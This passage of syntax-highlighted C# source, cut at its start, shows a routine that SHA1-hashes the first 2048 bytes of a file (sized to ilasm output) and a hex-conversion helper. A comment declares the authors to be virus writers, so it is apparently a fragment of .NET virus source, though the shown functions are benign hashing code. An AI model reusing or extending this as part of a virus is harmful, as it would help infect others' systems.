   </span><span class="sc2">// why 2048? 2048 is the minimun file size that ilasm produces... we don't want some errors to happen here, ei!
</span><span class="sc0">   </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">FSsha</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">OpenOrCreate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">BRsha</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">FSsha</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">BRsha</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Begin</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">Bsha</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">[</span><span class="sc4">2048</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">B2R</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2048</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">BR</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">B2R</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BRsha</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">Bsha</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">B2R</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n1</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">BR</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">n1</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">B2R</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">n1</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">BRsha</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
   </span><span class="sc11">SHA1</span><span class="sc0"> </span><span class="sc11">sha</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">SHA1CryptoServiceProvider</span><span class="sc10">();</span><span class="sc0"> 
   </span><span class="sc11">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sha</span><span class="sc10">.</span><span class="sc11">ComputeHash</span><span class="sc10">(</span><span class="sc11">Bsha</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// result contains the SHA1 byte represention of the 2048 input data
</span><span class="sc0">   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">BytesToHexString</span><span class="sc10">(</span><span class="sc11">result</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// we need to convert that byte rep to hex rep..
</span><span class="sc0">   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">BytesToHexString</span><span class="sc10">(</span><span class="sc11">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">bytes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">// excerpt from http://support.microsoft.com/default.aspx?scid=kb;en-us;Q312906
</span><span class="sc0">   </span><span class="sc10">{</span><span class="sc0">                        </span><span class="sc2">// antivirus companies must thank virus writers and we, virus writers must
</span><span class="sc0">                        </span><span class="sc2">// thank microsoft.. :)
</span><span class="sc0">   </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">hexString</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">(</span><span class="sc4">64</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">counter</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">counter</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">counter</span><span class="sc10">++)</span><span class="sc0"> 
   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">hexString</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">String</span><span class="sc10">.</span><span class="sc11">Format</span><span class="sc10">(</span><span class="sc6">"{0:X2}"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bytes</span><span class="sc10">[</span><span class="sc11">counter</span><span class="sc10">]));</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">hexString</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
